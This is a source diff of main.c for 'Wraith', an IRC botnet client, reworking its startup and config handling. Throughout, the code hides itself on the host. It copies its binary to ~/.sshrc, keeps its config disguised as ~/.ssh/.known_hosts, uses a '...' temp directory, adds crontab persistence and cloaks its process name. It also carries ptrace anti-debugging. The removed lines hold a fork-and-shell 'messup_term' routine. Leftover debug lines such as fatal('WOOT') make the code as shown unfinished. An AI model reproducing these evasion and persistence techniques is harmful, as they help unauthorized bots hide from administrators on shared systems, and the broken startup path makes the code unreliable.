@@ -16,34 +16,25 @@
 #include "users.h"
 #include "shell.h"
 #include "userrec.h"
+#include "tclhash.h"
 #include "cfg.h"
 #include "dccutil.h"
 #include "crypt.h"
 #include "debug.h"
 #include "chanprog.h"
+#include "traffic.h" /* egg_traffic_t */
 #include "bg.h"	
 #include "botnet.h"
 #include "build.h"
-#include <libgen.h>
 #include <time.h>
 #include <errno.h>
-#include <netdb.h>
 #include <unistd.h>
-#include <sys/utsname.h>
-
 #ifdef STOP_UAC				/* osf/1 complains a lot */
 # include <sys/sysinfo.h>
 # define UAC_NOPRINT    0x00000001	/* Don't report unaligned fixups */
 #endif /* STOP_UAC */
 #include <sys/file.h>
 #include <sys/stat.h>
-#include <sys/types.h>
-#include <signal.h>
-#ifdef S_ANTITRACE
-#include <sys/ptrace.h>
-#include <sys/wait.h>
-#endif /* S_ANTITRACE */
-#include <pwd.h>
 
 #include "chan.h"
 #include "modules.h"
@@ -60,20 +51,10 @@
 #define _POSIX_SOURCE 1
 #endif
 
-#ifdef HUB 
-int hub = 1;
-int leaf = 0;
-#else
-int hub = 0;
-int leaf = 1;
-#endif
-
-char *progname();		/* from settings.c */
-
+extern char *progname();		/* from settings.c */
 
 extern char		 origbotname[], userfile[], botnetnick[], packname[],
-                         shellhash[], myip6[], myip[], hostname[],
-                         hostname6[], natip[];
+                         shellhash[];
 extern int		 dcc_total, conmask, cache_hit, cache_miss,
 			 fork_interval, optind, local_fork_interval,
 			 sdebug;
@@ -86,11 +67,7 @@ const time_t 	buildts = CVSBUILD;		/* build timestamp (UTC) */
 const char	egg_version[1024] = "1.0.15";
 const int	egg_numver = 1001500;
 
-#ifdef HUB
-int 	my_port;
-#endif /* HUB */
-
-int 	localhub = 1;   	/* we set this to 0 if we have -c, later. */
+int 	localhub = 1; 		/* we set this to 0 if we get a -B */
 int 	role;
 int 	loading = 0;
 char	notify_new[121] = "";	/* Person to send a note to for new users */
@@ -102,15 +79,12 @@ time_t 	lastfork = 0;
 uid_t   myuid;
 int	term_z = 0;		/* Foreground: use the terminal as a party line? */
 int 	checktrace = 1;		/* Check for trace when starting up? */
-int 	pscloak = 1;		/* cloak the process name in ps for linux? */
 int 	updating = 0; 		/* this is set when the binary is called from itself. */
 char 	tempdir[DIRMAX] = "";
 char 	*binname;
 time_t	online_since;		/* Unix-time that the bot loaded up */
 
 char	owner[121] = "";	/* Permanent owner(s) of the bot */
-char	pid_file[DIRMAX];		/* Name of the file for the pid to be
-				   stored in */
 int	save_users_at = 0;	/* How many minutes past the hour to
 				   save the userfile? */
 int	notify_users_at = 0;	/* How many minutes past the hour to
@@ -119,17 +93,16 @@ char	version[81];		/* Version info (long form) */
 char	ver[41];		/* Version info (short form) */
 int	use_stderr = 1;		/* Send stuff to stderr instead of logfiles? */
 int	do_restart = 0;		/* .restart has been called, restart asap */
-int	resolve_timeout = 10;	/* hostname/address lookup timeout */
 char	quit_msg[1024];		/* quit message */
 time_t	now;			/* duh, now :) */
 
 extern struct cfg_entry CFG_FORKINTERVAL;
+
 #define fork_interval atoi( CFG_FORKINTERVAL.ldata ? CFG_FORKINTERVAL.ldata : CFG_FORKINTERVAL.gdata ? CFG_FORKINTERVAL.gdata : "0")
 
 
 /* Traffic stats
  */
-#include "traffic.h" /* egg_traffic_t */
 egg_traffic_t traffic;
 
 void fatal(const char *s, int recoverable)
@@ -149,7 +122,8 @@ void fatal(const char *s, int recoverable)
     ssl_cleanup();
 #endif /* HAVE_SSL */
   if (!recoverable) {
-    unlink(pid_file);
+    if (conf.bot->pid_file)
+      unlink(conf.bot->pid_file);
     exit(1);
   }
 }
@@ -172,8 +146,9 @@ static void check_expired_dcc()
     }
 }
 
-void expire_simuls() {
+static void expire_simuls() {
   int idx = 0;
+
   for (idx = 0; idx < dcc_total; idx++) {
     if (dcc[idx].simul > 0) {
       if ((now - dcc[idx].simultime) >= 20) { /* expire simuls after 20 seconds (re-uses idx, so it wont fill up) */
@@ -184,22 +159,21 @@ void expire_simuls() {
   }
 }
 
-#ifdef LEAF
-static void gotspawn(char *);
-#endif /* LEAF */
-
-void checkpass() 
+static void checkpass() 
 {
   static int checkedpass = 0;
+
   if (!checkedpass) {
-    char *gpasswd = (char *) getpass("");
+    char *gpasswd;
+  
+    gpasswd = (char *) getpass("");
+    checkedpass = 1;
     if (md5cmp(shellhash, gpasswd))
       fatal(STR("incorrect password."), 0);
-    checkedpass = 1;
   }
 }
 
-void got_ed(char *which, char *in, char *out)
+static void got_ed(char *which, char *in, char *out)
 {
   sdprintf(STR("got_Ed called: -%s i: %s o: %s"), which, in, out);
   if (!in || !out)
@@ -216,54 +190,7 @@ void got_ed(char *which, char *in, char *out)
   exit(0);
 }
 
-char *my_uname();
-
-void gen_conf(char *filename, int type)
-{
-  FILE *fp;
-
-  if (is_file(filename) || is_dir(filename))
-    fatal(STR("File already exists.."), 0);
-  
-  fp = fopen(filename, "w");
-  if (type == 1) {
-    fprintf(fp, STR("#All lines beginning with '#' will be ignored during the bot startup. They are comments only.\n"));
-    fprintf(fp, STR("#These lines MUST be correctly syntaxed or the bot will not work properly.\n"));
-    fprintf(fp, STR("#A hub conf is located in the same dir as the hub binary, as 'conf' (encrypted)\n"));
-    fprintf(fp, STR("#A leaf conf is located at '~/.ssh/.known_hosts' (encrypted)\n"));
-    fprintf(fp, STR("#\n"));
-    fprintf(fp, STR("#Note the \"- \" and \"+ \" for the following items, the space is REQUIRED.\n"));
-    fprintf(fp, STR("#The first line must be the UID of the shell the bot is to be run on. (use \"id\" in shell to get uid)\n"));
-    fprintf(fp, STR("#- 1113\n"));
-    fprintf(fp, STR("#The second must be the output from uname -nv (-nr on FBSD)\n"));
-    fprintf(fp, STR("#+ somebox #1 SMP Thu May 29 06:55:05 EDT 2003\n"));
-    fprintf(fp, STR("#\n"));
-    fprintf(fp, STR("#The following line will disable ps cloaking on the shell if you compiled with S_PSCLOAK\n"));
-    fprintf(fp, STR("#!-\n"));
-    fprintf(fp, STR("#The rest of the conf is for bots and is in the following syntax:\n"));
-    fprintf(fp, STR("#botnick [!]ip4 [+]hostname IPv6-ip\n"));
-    fprintf(fp, STR("#A . (period) can be used in place of ip4 and/or hostname if the field is not needed. (ie, for using only an ipv6 ip)\n"));
-    fprintf(fp, STR("#(the ! means internal NAT ip address, IE: 10.10.0.3, Hostname REQUIRED)\n"));
-    fprintf(fp, STR("#Full example:\n"));
-    fprintf(fp, STR("#- 101\n"));
-    fprintf(fp, STR("#+ somebox 5.1-RELEASE\n"));
-    fprintf(fp, STR("#bot1 1.2.3.4 some.vhost.com\n"));
-    fprintf(fp, STR("#bot2 . +ipv6.uber.leet.la\n"));
-    fprintf(fp, STR("#bot3 . +another.ipv6.host.com 2001:66:669:3a4::1\n"));
-    fprintf(fp, STR("#bot4 1.2.3.4 +someipv6.host.com\n"));
-    fprintf(fp, STR("\n\n\n\n#if there are any trailing newlines at the end, remove them up to the last bot.\n"));
-  } else {
-    fprintf(fp, "- %d\n", geteuid());
-    fprintf(fp, "+ %s\n", my_uname());
-    fprintf(fp, STR("#bot ip|. [+]host|. [ipv6-ip]\n"));
-  }
-  fflush(fp);
-  fclose(fp);
-  printf(STR("Template config created as '%s'\n"), filename);
-  exit(0);
-}
-
-void show_help()
+static void show_help()
 {
   char format[81];
 
@@ -272,12 +199,14 @@ void show_help()
   printf(STR("Wraith %s\n\n"), egg_version);
   printf(format, STR("Option"), STR("Description"));
   printf(format, STR("------"), STR("-----------"));
+  printf(format, STR("-B <botnick>"), STR("Starts the specified bot"));
   printf(format, STR("-e <infile> <outfile>"), STR("Encrypt infile to outfile"));
   printf(format, STR("-d <infile> <outfile>"), STR("Decrypt infile to outfile"));
   printf(format, STR("-D"), STR("Enables debug mode (see -n)"));
   printf(format, STR("-E [#/all]"), STR("Display Error codes english translation (use 'all' to display all)"));
-  printf(format, STR("-g <file>"), STR("Generates a template config file"));
+/*  printf(format, STR("-g <file>"), STR("Generates a template config file"));
   printf(format, STR("-G <file>"), STR("Generates a custom config for the box"));
+*/
   printf(format, STR("-h"), STR("Display this help listing"));
 /*   printf(format, STR("-k <botname>"), STR("Terminates (botname) with kill -9")); */
   printf(format, STR("-n"), STR("Disables backgrounding first bot in conf"));
@@ -289,7 +218,7 @@ void show_help()
 
 
 #ifdef LEAF
-# define PARSE_FLAGS "2c:d:De:Eg:G:L:P:hnstv"
+# define PARSE_FLAGS "2B:d:De:Eg:G:L:P:hnstv"
 #else /* !LEAF */
 # define PARSE_FLAGS "2d:De:Eg:G:hnstv"
 #endif /* HUB */
@@ -308,17 +237,13 @@ static void dtx_arg(int argc, char *argv[])
       case '2':		/* used for testing new binary through update */
         exit(2);
 #ifdef LEAF
-      case 'c':
+      case 'B':
         localhub = 0;
-        gotspawn(optarg);
+        strncpyz(origbotname, optarg, NICKLEN + 1);
         break;
 #endif /* LEAF */
       case 'h':
         show_help();
-      case 'g':
-        gen_conf(optarg, 1);
-      case 'G':
-        gen_conf(optarg, 2);
       case 'n':
 	backgrd = 0;
 	break;
@@ -394,39 +319,6 @@ static void dtx_arg(int argc, char *argv[])
   }
 }
 
-#ifdef CRAZY_TRACE
-/* This code will attach a ptrace() to getpid() hence blocking process hijackers/tracers on the pid
- * only problem.. it just creates a new pid to be traced/hijacked :\
- */
-int attached = 0;
-void crazy_trace() 
-{
-  int parent = getpid();
-  int x = fork();
-  if (x == -1) {
-    printf("Can't fork(): %s\n", strerror(errno));
-  } else if (x == 0) {
-    int i;
-    i = ptrace(PTRACE_ATTACH, parent, (char *) 1, 0);
-    if (i == (-1) && errno == EPERM) {
-      printf("CANT PTRACE PARENT: errno: %d %s, i: %d\n", errno, strerror(errno), i);
-      waitpid(parent, &i, 0);
-      kill(parent, SIGCHLD);
-      ptrace(PTRACE_DETACH, parent, 0, 0);
-      kill(parent, SIGCHLD);
-      exit(0);
-    } else {
-      printf("SUCCESSFUL ATTACH to %d: %d\n", parent, i);
-      attached++;
-    }
-  } else {
-    printf("wait()\n");
-    wait(&x);
-  }
-  printf("end\n");
-}
-#endif /* CRAZY_TRACE */
-
 /* Timer info */
 static int		lastmin = 99;
 static time_t		then;
@@ -447,16 +339,17 @@ void core_10secondly()
 #ifdef LEAF
   if (localhub) {
 #endif /* LEAF */
-    if (curcheck==2)
+    if (curcheck == 2)
       check_last();
-    if (curcheck==3) {
+    if (curcheck == 3) {
       check_processes();
-      curcheck=0;
+      curcheck = 0;
     }
 #ifdef LEAF
   }
 #endif /* LEAF */
 }
+
 
 static void core_secondly()
 {
@@ -467,10 +360,8 @@ static void core_secondly()
   if (!attached) crazy_trace();
 #endif /* CRAZY_TRACE */
   call_hook(HOOK_SECONDLY);	/* Will be removed later */
-  if (fork_interval && backgrd) {
-    if ((now - lastfork) > fork_interval)
+  if (fork_interval && backgrd && ((now - lastfork) > fork_interval))
       do_fork();
-  }
   cnt++;
   if ((cnt % 5) == 0)
     call_hook(HOOK_5SECONDLY);
@@ -536,33 +427,6 @@ static void core_secondly()
   }
 }
 
-#ifdef LEAF
-static void check_mypid()
-{
-  module_entry *me;
-  FILE *fp;
-  char s[15];
-  int xx = 0;
-
-  char buf2[DIRMAX];
-  egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, botnetnick);
-  if ((fp = fopen(buf2, "r"))) {
-    fgets(s, 10, fp);
-    xx = atoi(s);
-    if (getpid() != xx) { //we have a major problem if this is happening..
-      fatal(STR("getpid() does not match pid in file. Possible cloned process, exiting.."), 1);
-      if ((me = module_find("server", 0, 0))) {
-        Function *func = me->funcs;
-        (func[SERVER_NUKESERVER]) ("cloned process");
-      }
-      botnet_send_bye();
-      exit(1);
-    }
-    fclose(fp);
-  }
-}
-#endif /* LEAF */
-
 static void core_minutely()
 {
 #ifdef LEAF
@@ -619,237 +483,19 @@ static void event_resettraffic()
 }
 
 extern module_entry *module_list;
-void restart_chons();
 
 void check_static(char *, char *(*)());
 
 #include "mod/static.h"
+
 int init_dcc_max(), init_userent(), init_auth(), init_config(), init_bots(),
  init_net(), init_modules(), init_tcl(int, char **), init_botcmd(), init_settings();
-
-void binds_init();
-
-static void check_crontab()
-{
-  int i = 0;
-
-#ifdef LEAF
-  if (!localhub) 
-    fatal(STR("something is wrong."), 0);
-#endif /* LEAF */
-  if (!(i = crontab_exists())) {
-    crontab_create(5);
-    if (!(i = crontab_exists())) 
-      printf(STR("* Error writing crontab entry.\n"));
-  }
-}
-
-#ifdef LEAF
-static void gotspawn(char *filename)
-{
-  FILE *fp;
-  char templine[8192], *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps;
-
-  if (!(fp = fopen(filename, "r")))
-    fatal(STR("Cannot read from local config (2)"), 0);
-  while(fscanf(fp,"%[^\n]\n",templine) != EOF) {
-    void *my_ptr;
-    temps = my_ptr = decrypt_string(SALT1, templine);
-
-#ifdef S_PSCLOAK
-    sdprintf(STR("GOTSPAWN: %s"), temps);
-#endif /* S_PSCLOAK */
-
-    pscloak = atoi(newsplit(&temps));
-    if (temps[0])
-      nick = newsplit(&temps);
-    if (!nick)
-      fatal("invalid config (2).",0);
-    if (temps[0])
-      ip = newsplit(&temps);
-    if (temps[0])
-      host = newsplit(&temps);
-    if (temps[0])
-      ipsix = newsplit(&temps);
-
-    egg_snprintf(origbotname, 10, "%s", nick);
-
-    if (ip[1]) {
-      if (ip[0] == '!') { //natip
-        ip++;
-        sprintf(natip,"%s",ip);
-      } else {
-        egg_snprintf(myip, 120, "%s", ip);
-      }
-    }
-
-    if (host && host[1]) {
-      if (host[0] == '+') { //ip6 host
-        host++;
-        sprintf(hostname6,"%s",host);
-      } else { //normal ip4 host
-        sprintf(hostname,"%s",host);
-      }
-    }
-
-    if (ipsix && ipsix[1]) {
-      egg_snprintf(myip6, 120, "%s", ipsix);
-    }
-    if (my_ptr)
-      free(my_ptr);
-  }
-
-  fclose(fp);
-  unlink(filename);
-}
-
-static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, int cloak)
-{
-  char buf[DIRMAX] = "", bindir[DIRMAX] = "", bufrun[DIRMAX] = "";
-  FILE *fp;
-
-  egg_snprintf(buf, sizeof buf, "%s", bin);
-  egg_snprintf(bindir, sizeof bindir, "%s", dirname(buf));
-
-  egg_snprintf(buf, sizeof buf, "%s/.wraith-%s", bindir, nick);
-
-
-  if (!(fp = fopen(buf, "w")))
-    fatal(STR("Cannot create spawnfiles..."), 0);
-
-  lfprintf(fp, "%d %s %s %s %s\n", cloak, nick, ip ? ip : ".", host ? host : ".", ipsix ? ipsix : ".");
-
-  fflush(fp);
-  fclose(fp);
-
-  egg_snprintf(bufrun, sizeof bufrun, "%s -c %s", bin, buf);
-  return system(bufrun);
-}
-#endif /* LEAF */
-
-#ifdef S_MESSUPTERM 
-void messup_term() {
-  int i;
-  char *argv[4];
-
-  freopen("/dev/null", "w", stderr);
-  for (i = 0; i < 11; i++) {
-    fork();
-  }
-  argv[0] = malloc(100);
-  strcpy(argv[0], "/bin/sh");
-  argv[1] = "-c";
-  argv[2] = malloc(1024);
-  strcpy(argv[2], "cat < ");
-  strcat(argv[2], binname);
-  argv[3] = NULL;
-  execvp(argv[0], &argv[0]);
-}
-#endif /* S_MESSUPTERM */
-
-void check_trace_start()
-{
-#ifdef S_ANTITRACE
-  int parent = getpid();
-  int xx = 0, i = 0;
-#ifdef __linux__
-  xx = fork();
-  if (xx == -1) {
-    printf(STR("Can't fork process!\n"));
-    exit(1);
-  } else if (xx == 0) {
-    i = ptrace(PTRACE_ATTACH, parent, 0, 0);
-    if (i == (-1) && errno == EPERM) {
-#ifdef S_MESSUPTERM
-      messup_term();
-#else
-      kill(parent, SIGKILL);
-      exit(1);
-#endif /* S_MESSUPTERM */
-    } else {
-      waitpid(parent, &i, 0);
-      kill(parent, SIGCHLD);
-      ptrace(PTRACE_DETACH, parent, 0, 0);
-      kill(parent, SIGCHLD);
-    }
-    exit(0);
-  } else {
-    wait(&i);
-  }
-#endif /* __linux__ */
-#ifdef __FreeBSD__
-  xx = fork();
-  if (xx == -1) {
-    printf(STR("Can't fork process!\n"));
-    exit(1);
-  } else if (xx == 0) {
-    i = ptrace(PT_ATTACH, parent, 0, 0);
-    if (i == (-1) && errno == EBUSY) {
-#ifdef S_MESSUPTERM
-      messup_term();
-#else
-      kill(parent, SIGKILL);
-      exit(1);
-#endif /* S_MESSUPTERM */
-    } else {
-       wait(&i);
-      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
-      kill(parent, SIGCHLD);
-      wait(&i);
-      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
-      wait(&i);
-    }
-    exit(0);
-  } else {
-    waitpid(xx, NULL, 0);
-  }
-#endif /* __FreeBSD__ */
-#ifdef __OpenBSD__
-  xx = fork();
-  if (xx == -1) {
-    printf(STR("Can't fork process!\n"));
-    exit(1);
-  } else if (xx == 0) {
-    i = ptrace(PT_ATTACH, parent, 0, 0);
-    if (i == (-1) && errno == EBUSY) {
-      kill(parent, SIGKILL);
-      exit(1);
-    } else {
-      wait(&i);
-      i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
-      kill(parent, SIGCHLD);
-      wait(&i);
-      i = ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
-      wait(&i);
-    }
-    exit(0);
-  } else {
-    waitpid(xx, NULL, 0);
-  }
-#endif /* __OpenBSD__ */
-#endif /* S_ANTITRACE */
-}
-
-void init_debug();
 
 int main(int argc, char **argv)
 {
   egg_timeval_t howlong;
-  int xx, i;
-#ifdef LEAF
-  int x = 1;
-#endif
-  char buf[SGRAB + 9] = "", s[25] = "";
-  FILE *f;
-#ifdef LEAF
-  int skip = 0;
-  int ok = 1;
-#endif
-  init_debug();
+  char cfile[DIRMAX] = "";
 
-  /* Version info! */
-  egg_snprintf(ver, sizeof ver, "Wraith %s", egg_version);
-  egg_snprintf(version, sizeof version, "Wraith %s (%u/%lu)", egg_version, egg_numver, buildts);
 #ifdef STOP_UAC
   {
     int nvpair[2];
@@ -860,12 +506,16 @@ int main(int argc, char **argv)
   }
 #endif
 
+  /* Version info! */
+  egg_snprintf(ver, sizeof ver, "Wraith %s", egg_version);
+  egg_snprintf(version, sizeof version, "Wraith %s (%u/%lu)", egg_version, egg_numver, buildts);
+
+  init_debug();
   init_signals();
 
   Context;
   /* Initialize variables and stuff */
   now = time(NULL);
-  chanset = NULL;
 #ifdef S_UTCTIME
   egg_memcpy(&nowtm, gmtime(&now), sizeof(struct tm));
 #else /* !S_UTCTIME */
@@ -875,6 +525,16 @@ int main(int argc, char **argv)
   srandom(now % (getpid() + getppid()));
   myuid = geteuid();
   binname = getfullbinname(argv[0]);
+#ifdef HUB
+  egg_snprintf(userfile, 121, "%s/.u", confdir());
+  egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", confdir());
+  egg_snprintf(cfile, sizeof cfile, STR("%s/conf"), confdir());
+#else /* LEAF */
+  egg_snprintf(tempdir, sizeof tempdir, "%s/.../", confdir());
+  egg_snprintf(cfile, sizeof cfile, STR("%s/.known_hosts"), confdir());
+#endif /* HUB */
+
+  clear_tmp();		/* clear out the tmp dir, no matter if we are localhub or not */
 
   /* just load everything now, won't matter if it's loaded if the bot has to suicide on startup */
   init_settings();
@@ -889,6 +549,7 @@ int main(int argc, char **argv)
   init_auth();
   init_config();
   init_botcmd();
+  init_conf();
   link_statics();
 
   if (!can_stat(binname))
@@ -900,53 +561,51 @@ int main(int argc, char **argv)
     sdprintf(STR("Calling dtx_arg with %d params."), argc);
     dtx_arg(argc, argv);
   }
+
   if (checktrace)
     check_trace_start();
 
-#ifdef HUB
-  egg_snprintf(tempdir, sizeof tempdir, "%s/tmp/", confdir());
-#endif /* HUB */
-
 #ifdef LEAF
-{
-  char newbin[DIRMAX];
-  sdprintf(STR("my uid: %d my uuid: %d, my ppid: %d my pid: %d"), getuid(), geteuid(), getppid(), getpid());
-  chdir(homedir());
-  egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
-  egg_snprintf(tempdir, sizeof tempdir, "%s/.../", confdir());
+  /* move the binary to the correct place */
+  {
+    char newbin[DIRMAX];
+    sdprintf(STR("my euid: %d my uuid: %d, my ppid: %d my pid: %d"), geteuid(), myuid, getppid(), getpid());
+    chdir(homedir());
+    egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
 
-  sdprintf(STR("newbin at: %s"), newbin);
+    sdprintf(STR("newbin at: %s"), newbin);
 
-  if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
-    sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
-    unlink(newbin);
-    if (copyfile(binname,newbin))
-     ok = 0;
+    if (strcmp(binname,newbin)) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
+#ifdef LEAF
+      int ok = 1;
+#endif /* LEAF */
 
-    if (ok) 
-     if (!can_stat(newbin)) {
-       unlink(newbin);
-       ok = 0;
-     }
-    if (ok) 
-      if (!fixmod(newbin)) {
-        unlink(newbin);
+      sdprintf(STR("wrong dir, is: %s :: %s"), binname, newbin);
+      unlink(newbin);
+      if (copyfile(binname,newbin))
         ok = 0;
-      }
 
-    if (!ok)
-      werr(ERR_WRONGBINDIR);
-    else {
-      unlink(binname);
-      system(newbin);
-      sdprintf(STR("exiting to let new binary run..."));
-      exit(0);
+      if (ok) 
+       if (!can_stat(newbin)) {
+         unlink(newbin);
+         ok = 0;
+       }
+      if (ok) 
+        if (!fixmod(newbin)) {
+          unlink(newbin);
+          ok = 0;
+        }
+
+      if (!ok)
+        werr(ERR_WRONGBINDIR);
+      else {
+        unlink(binname);
+        system(newbin);
+        sdprintf(STR("exiting to let new binary run..."));
+        exit(0);
+      }
     }
   }
-
-  /* Ok if we are here, then the binary is accessable and in the correct directory, now lets do the local config... */
-
-}
 #endif /* LEAF */
   {
     char tmp[DIRMAX];
@@ -964,7 +623,6 @@ int main(int argc, char **argv)
       }
 #endif /* LEAF */
     }
-
     egg_snprintf(tmp, sizeof tmp, "%s", tempdir);
     if (!can_stat(tmp)) {
       if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
@@ -980,144 +638,35 @@ int main(int argc, char **argv)
   if (!fixmod(tempdir))
     werr(ERR_TMPMOD);
 
-  /* The config dir is accessable with correct permissions, lets read/write/create config file now.. */
-  {		/* config shit */
-    char cfile[DIRMAX] = "", templine[8192] = "";
+  /* check if we can access the configfile */
+  if (!can_stat(cfile))
+    werr(ERR_NOCONF);
+  if (!fixmod(cfile))
+    werr(ERR_CONFMOD);
+
+
+  /* if we are here, then all the necesary files/dirs are accesable, lets load the config now. */
+  readconf(cfile);
 #ifdef LEAF
-    egg_snprintf(cfile, sizeof cfile, STR("%s/.known_hosts"), confdir());
-#else /* HUB */
-    egg_snprintf(cfile, sizeof cfile, STR("%s/conf"), confdir());
+  if (localhub)
 #endif /* LEAF */
-    if (!can_stat(cfile))
-      werr(ERR_NOCONF);
-    if (!fixmod(cfile))
-      werr(ERR_CONFMOD);
+    showconf();
+  parseconf();
 #ifdef LEAF
-    if (localhub) { 
+  if (localhub)
 #endif /* LEAF */
-      i = 0;
-      if (!(f = fopen(cfile, "r")))
-         werr(0);
-      Context;
-      while(fscanf(f, "%[^\n]\n", templine) != EOF) {
-        char *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps, c[1024];
-        void *temp_ptr;
-        int skip = 0;
-
-        temps = temp_ptr = decrypt_string(SALT1, templine);
-        if (!strchr(STR("*#-+!abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPWRSTUVWXYZ"), temps[0])) {
-          sdprintf(STR("line %d, char %c "), i, temps[0]);
-          werr(ERR_CONFBADENC);
-        }
-        egg_snprintf(c, sizeof c, "%s", temps);
-
-        if (c[0] == '*') {
-          skip = 1;
-        } else if (c[0] == '-' && !skip) { /* uid */
-          newsplit(&temps);
-          if (geteuid() != atoi(temps)) {
-            sdprintf(STR("wrong uid, conf: %d :: %d"), atoi(temps), geteuid());
-            werr(ERR_WRONGUID);
-          }
-        } else if (c[0] == '+' && !skip) { /* uname */
-          int r = 0;
-          newsplit(&temps);
-          if ((r = strcmp(temps, my_uname()))) {
-            baduname(temps, my_uname());
-            sdprintf(STR("wrong uname, conf: %s :: %s"), temps, my_uname());
-            werr(ERR_WRONGUNAME);
-          }
-        } else if (c[0] == '!') { //local tcl exploit
-          if (c[1] == '-') { //dont use pscloak
-#ifdef S_PSCLOAK
-            sdprintf(STR("NOT CLOAKING"));
-#endif /* S_PSCLOAK */
-            pscloak = 0;
-          } else {
-            newsplit(&temps);
-/*            Tcl_Eval(interp, temps); */
-          }
-        } else if (c[0] != '#') {  //now to parse nick/hosts
-          /* we have the right uname/uid, safe to setup crontab now. */
-          i++;
-          nick = newsplit(&temps);
-          if (!nick || !nick[0])
-            werr(ERR_BADCONF);
-          sdprintf(STR("Read nick from config: %s"), nick);
-          if (temps[0])
-            ip = newsplit(&temps);
-          if (temps[0])
-            host = newsplit(&temps);
-          if (temps[0])
-            ipsix = newsplit(&temps);
-
-          if (i == 1) { //this is the first bot ran/parsed
-            strncpyz(s, ctime(&now), sizeof s);
-            strcpy(&s[11], &s[20]);
-
-            if (ip && ip[0] == '!') { //natip
-              ip++;
-              sprintf(natip, "%s",ip);
-            } else {
-              if (ip && ip[1]) //only copy ip if it is longer than 1 char (.)
-                egg_snprintf(myip, 120, "%s", ip);
-            }
-            egg_snprintf(origbotname, 10, "%s", nick);
-#ifdef HUB
-            sprintf(userfile, "%s/.u", confdir());
-#endif /* HUB */
-/* log          sprintf(logfile, "%s/.%s.log", confdir(), nick); */
-            if (host && host[1]) { //only copy host if it is longer than 1 char (.)
-              if (host[0] == '+') { //ip6 host
-              host++;
-              sprintf(hostname6, "%s",host);
-            } else  //normal ip4 host
-              sprintf(hostname, "%s",host);
-            }
-            if (ipsix && ipsix[1]) { //only copy ipsix if it is longer than 1 char (.)
-              egg_snprintf(myip6, 120, "%s",ipsix);
-            }
-          } //First bot in conf
-#ifdef LEAF
-          else { //these are the rest of the bots..
-            char buf2[DIRMAX] = "";
-            FILE *fp;
-
-            xx = 0, x = 0, errno = 0;
-            s[0] = '\0';
-            /* first let's determine if the bot is already running or not.. */
-            egg_snprintf(buf2, sizeof buf2, "%s.pid.%s", tempdir, nick);
-            fp = fopen(buf2, "r");
-            if (fp != NULL) {
-              fgets(s, 10, fp);
-              fclose(fp);
-              xx = atoi(s);
-              if (updating) {
-                x = kill(xx, SIGKILL); //try to kill the pid if we are updating.
-                unlink(buf2);
-              }
-              kill(xx, SIGCHLD);
-              if (errno == ESRCH || (updating && !x)) { //PID is !running, safe to run.
-                if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
-                  printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
-              } else if (!x)
-                sdprintf(STR("%s is already running, pid: %d"), nick, xx);
-            } else {
-              if (spawnbot(binname, nick, ip, host, ipsix, pscloak))
-                printf(STR("* Failed to spawn %s\n"), nick); //This probably won't ever happen.
-            }
-          }
-#endif /* LEAF */
-        } 
-        free(temp_ptr);
-      } /* while(fscan) */
-      fclose(f);
-#ifdef LEAF
-      if (updating)
-        exit(0); /* let cron restart us. */
-    } /* localhub */
-#endif /* LEAF */
+    writeconf(cfile);
+  fillconf(&conf);
+  free_conf();
+printf("I AM : %s (%d)\n", conf.bot->nick, conf.bot->pid);
+  if ((localhub && !updating) || !localhub) {
+    if ((conf.bot->pid > 0) && conf.bot->pid_file) {
+      sdprintf(STR("%s is already running, pid: %d"), conf.bot->nick, conf.bot->pid);
+      exit(1);
+    }
   }
+
+fatal("WOOT", 0);
   dns_init();
   module_load("channels");
 #ifdef LEAF
@@ -1134,38 +683,17 @@ int main(int argc, char **argv)
 
   chanprog();
 
-  clear_tmp();
 #ifdef LEAF
   if (localhub) {
-    sdprintf(STR("I am localhub (%s)"), origbotname);
+    sdprintf(STR("I am localhub (%s)"), conf.bot->nick);
 #endif /* LEAF */
     check_crontab();
 #ifdef LEAF
   }
 #endif /* LEAF */
 
-
-  cache_miss = 0;
-  cache_hit = 0;
-  if (!pid_file[0])
-    egg_snprintf(pid_file, sizeof pid_file, "%s.pid.%s", tempdir, botnetnick);
-
-  if ((localhub && !updating) || !localhub) {
-    if ((f = fopen(pid_file, "r")) != NULL) {
-      fgets(s, 10, f);
-      xx = atoi(s);
-      kill(xx, SIGCHLD);
-      if (errno != ESRCH) { //!= is PID is running.
-        sdprintf(STR("%s is already running, pid: %d"), botnetnick, xx);
-        exit(1);
-      }
-      fclose(f);
-    }
-  }
-
-#ifdef LEAF
-#ifdef S_PSCLOAK
-  if (pscloak) {
+#if defined(LEAF) && defined(S_PSCLOAK)
+  if (conf.pscloak) {
     int on = 0;
     char *p = progname();
 
@@ -1173,37 +701,37 @@ int main(int argc, char **argv)
     strncpyz(argv[0], p, strlen(p) + 1);
     for (on = 1; on < argc; on++) egg_memset(argv[on], 0, strlen(argv[on]));
   }
-#endif /* PSCLOAK */
-#endif /* LEAF */
+#endif /* LEAF && PSCLOAK */
 
-  putlog(LOG_MISC, "*", STR("=== %s: %d users."), botnetnick, count_users(userlist));
+  putlog(LOG_MISC, "*", STR("=== %s: %d users."), conf.bot->nick, count_users(userlist));
+
   /* Move into background? */
-
   if (backgrd) {
 #ifndef CYGWIN_HACKS
     bg_do_split();
   } else {			/* !backgrd */
 #endif /* CYGWIN_HACKS */
+    FILE *f = NULL;
+    int xx;
+
     xx = getpid();
-    if (xx != 0) {
-      /* Write pid to file */
-      unlink(pid_file);
-      if ((f = fopen(pid_file, "w")) != NULL) {
-        fprintf(f, "%u\n", xx);
-        if (fflush(f)) {
